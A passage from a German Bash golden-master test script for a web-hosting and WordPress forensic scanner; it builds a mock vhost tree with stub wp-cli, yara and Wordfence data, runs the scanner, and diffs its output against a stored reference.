    [[ -f "${lauf}/${d}" ]] && normalisieren "${lauf}/${d}" > "${ZIEL}/${d//\//_}"
  done
  # Die Ordnerstruktur selbst ist Teil des Verhaltens.
  (cd "$lauf" && find . -type f | sort) > "${ZIEL}/dateiliste.txt"
  # findings.json ist die Maschinenschnittstelle zum Reparaturteil. Wird sie
  # ungueltig, faellt das dort erst zur Laufzeit auf — im Vorfall, unter Druck.
  # Geprueft wird die ECHTE Datei, nicht die normalisierte: der Normalisierer
  # hat die Referenz schon einmal still zerstoert.
  if [[ -f "${lauf}/betreiber/findings.json" ]]; then
    if python3 -c 'import json,sys;json.load(open(sys.argv[1]))' "${lauf}/betreiber/findings.json"; then
      echo "gueltig" > "${ZIEL}/findings_json_gueltig.txt"
    else
      echo "UNGUELTIG" > "${ZIEL}/findings_json_gueltig.txt"
      warn "findings.json ist kein gueltiges JSON — die Schnittstelle zum Reparaturteil ist gebrochen."
    fi
  fi
  normalisieren "${ABLAGE}/konsole.txt" > "${ZIEL}/konsole.txt"
  cp "${ABLAGE}/rueckgabewert.txt" "${ZIEL}/" 2>/dev/null || true
  # Die Belegdateinamen sind Teil des Verhaltens, ihr Inhalt nicht.
  ls -1 "${lauf}/betreiber/belege" 2>/dev/null | sort > "${ZIEL}/belege_dateiliste.txt" || true
}

# ── Hauptteil ────────────────────────────────────────────────
echo -e "${BOLD}NT-Forensik · Goldmuster${NC}"
echo -e "  Programmstand: $(cd "$SELF_DIR" && git rev-parse --short HEAD 2>/dev/null || echo '?')"

BAUM="${ARBEIT}/vhosts"; ABLAGE="${ARBEIT}/ablage"
# Bewusst NEBEN dem Baum, nicht darin: was unter ${BAUM} liegt, wird gescannt,
# und der Bestand wuerde sich sonst selbst als Fund melden.
#
# NT_WEBSERVER haelt Abschnitt 13b.3 fest: ohne die Vorgabe entscheidet, ob auf
# der Maschine gerade nginx oder Apache laeuft, und die Referenz waere
# maschinenabhaengig. 'nginx' ist gewaehlt, weil dieser Zweig einen kritischen
# Befund erzeugt — der Pruefstand soll den Trefferpfad ueben, nicht das
# Schweigen.
#
# Beide Pfade lassen sich von aussen ueberschreiben (siehe lauf_ausfuehren).
# Das ist der Hebel fuer die Gegenproben in der CI: zeigt eine Quelle ins
# Leere, MUSS der Vergleich das bemerken. Ohne diesen Hebel liesse sich nicht
# zeigen, dass der Baum die jeweilige Pruefung ueberhaupt erreicht.
WPDATEN="${ARBEIT}/wpdaten"
WPSUMMEN="${ARBEIT}/wpsummen"     # lokale Plugin-Pruefsummen statt wordpress.org
ATTRAPPE="${ARBEIT}/bin"          # wp-cli-Attrappe, kommt vor den echten PATH
PMFAUS="${ARBEIT}/pmf_attrappe.txt"   # vorgefertigte yara-Ausgabe fuer 13c
WFDATEN="${ARBEIT}/wf_attrappe"       # vorgefertigter Wordfence-Bestand (#17)
DBDATEN="${ARBEIT}/db_attrappe"       # vorgefertigte wp_options-Auszuege (#47)
# Zwingend vor jedem Lauf. Bleibt der Ordner eines fehlgeschlagenen Vergleichs
# stehen, greift ausgabe_einsammeln per 'head -1' den ALTEN Laufordner und
# vergleicht ihn gegen die Referenz — der naechste Lauf meldet dann eine
# Abweichung, die es nicht gibt, oder verschweigt eine, die es gibt.
rm -rf "$ARBEIT"
mkdir -p "$ABLAGE"
baum_bauen "$BAUM"
wp_datenbestand_bauen "$WPDATEN"
attrappe_bauen "$ATTRAPPE"
pruefsummen_bauen "$WPSUMMEN" "$BAUM"
pmf_attrappe_bauen "$PMFAUS" "$BAUM"
wordfence_attrappe_bauen "$WFDATEN"
db_attrappe_bauen "$DBDATEN"

# ── Gegenprobe: umbenanntes plugins-Verzeichnis (#65) ────────
# Der Schalter benennt plugins/ nach plugins-old um — die uebliche
# Handbewegung, um eine Seite zur Fehlersuche plugin-frei zu starten.
#
# e1 prueft `[[ -f "<plugins>/<eintrag>" ]]`. Ohne das Verzeichnis scheitert
# der Test fuer JEDEN Eintrag, und die Regel meldet die vollstaendige
# Plugin-Liste als Leichen: ein maximaler Befund aus einem fehlenden
# Verzeichnis. Auf kundenserver42 waren 18 der 37 gemeldeten Eintraege genau
# das.
#
# Bewusst ein Schalter und keine zusaetzliche Instanz: die DB-Attrappe deckt
# genau eine Installation ab (`nur`), und sie auf zwei zu erweitern wuerde
# auch e2 und e3 verdoppeln — mehr Berichtszeilen, kein zusaetzlicher
# Nachweis. So bleibt die Referenz unberuehrt, und die CI prueft den Fall
# als SOLL-WERT: das ⚪ muss dastehen, die Leichen-Zeile nicht.
if [[ "${NT_PRUEFSTAND_OHNE_PLUGINDIR:-0}" == "1" ]]; then
  _pd="${BAUM}/kunde-zwei.example/httpdocs/wp-content/plugins"
  [[ -d "$_pd" ]] && mv "$_pd" "${_pd}-old"
fi
info "Baum gebaut: $(find "$BAUM" -type f | wc -l | tr -d ' ') Dateien in $(find "$BAUM" -maxdepth 1 -type d | tail -n +2 | wc -l | tr -d ' ') vhosts"

case "$AKTION" in
  baum)
    ok "Baum steht unter ${BAUM} — bleibt liegen."
    exit 0 ;;

  aufnehmen)
    lauf_ausfuehren "$BAUM" "$ABLAGE" || fail "Lauf mit Interpreter-Fehlern — siehe oben"
    rm -rf "$REF_DIR"; ausgabe_einsammeln "$ABLAGE" "$REF_DIR"
    ok "Referenz abgelegt unter pruefstand/referenz/"
    ls -1 "$REF_DIR" | sed 's/^/     /'
    warn "Referenz einchecken und im Commit sagen, von welchem Stand sie stammt."
    rm -rf "$ARBEIT" ;;

  vergleichen)
    [[ -d "$REF_DIR" ]] || fail "Keine Referenz vorhanden — zuerst: werkzeuge/goldmuster.sh aufnehmen"
    lauf_ausfuehren "$BAUM" "$ABLAGE" || fail "Lauf mit Interpreter-Fehlern — siehe oben"
    NEU="${ARBEIT}/neu"; ausgabe_einsammeln "$ABLAGE" "$NEU"
    echo
    ABWEICHUNG=0
    for f in "$REF_DIR"/*; do
      n="$(basename "$f")"
      if [[ ! -f "${NEU}/${n}" ]]; then
        fail "Datei fehlt im neuen Lauf: ${n}"
      fi
      if diff -q "$f" "${NEU}/${n}" >/dev/null; then
        ok "${n} unveraendert"
      else
        ABWEICHUNG=1
        warn "${n} weicht ab:"
        diff -u "$f" "${NEU}/${n}" | sed -n '3,40p' | sed 's/^/     /'
      fi
    done
    for f in "$NEU"/*; do
      n="$(basename "$f")"
      [[ -f "${REF_DIR}/${n}" ]] || { ABWEICHUNG=1; warn "neue Datei ohne Referenz: ${n}"; }
    done
    echo
    if [[ $ABWEICHUNG -eq 0 ]]; then
      ok "Keine Abweichung zur Referenz."
      rm -rf "$ARBEIT"; exit 0
    fi
    warn "Abweichungen gefunden. Beabsichtigt? Dann Referenz neu aufnehmen."
    info "Vollstaendiger Vergleich: diff -ru ${REF_DIR} ${NEU}"
    # Den Diff gleich zeigen, begrenzt. In der CI ist die Arbeitsablage nach
    # dem Job weg -- ohne Ausgabe hier bleibt von "Abweichung" nur der Befehl,
    # den niemand mehr ausfuehren kann (Lauf 33604567236: rot, Ursache unsichtbar).
    echo
    diff -ru "$REF_DIR" "$NEU" 2>/dev/null | head -150
    exit 1 ;;

  *) fail "Unbekannte Aktion: ${AKTION} (aufnehmen | vergleichen | baum)" ;;
esac
